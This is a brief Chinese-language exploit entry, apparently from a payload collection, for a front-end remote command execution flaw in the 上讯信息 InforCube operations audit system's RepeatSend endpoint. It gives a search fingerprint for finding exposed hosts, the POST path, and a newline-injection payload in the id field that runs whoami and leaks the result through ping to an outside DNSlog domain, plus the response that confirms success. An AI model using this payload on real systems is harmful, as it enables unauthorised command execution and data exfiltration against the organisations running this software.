# 上讯信息InforCube运维管理审计系统RepeatSend前台RCE漏洞

上讯信息InforCube运维管理审计系统RepeatSend前台 ｜ 命令执行 ｜ —
- **指纹**：`body="default/getloginhtml"`
- **请求**：`POST /emailapply/RepeatSend HTTP/1.1`

**Payload**
```
id='%0aping `whoami`.rksghqxnbe.dgrh3.cn%0a'
```
- **响应特征**：200 DNSLOG回显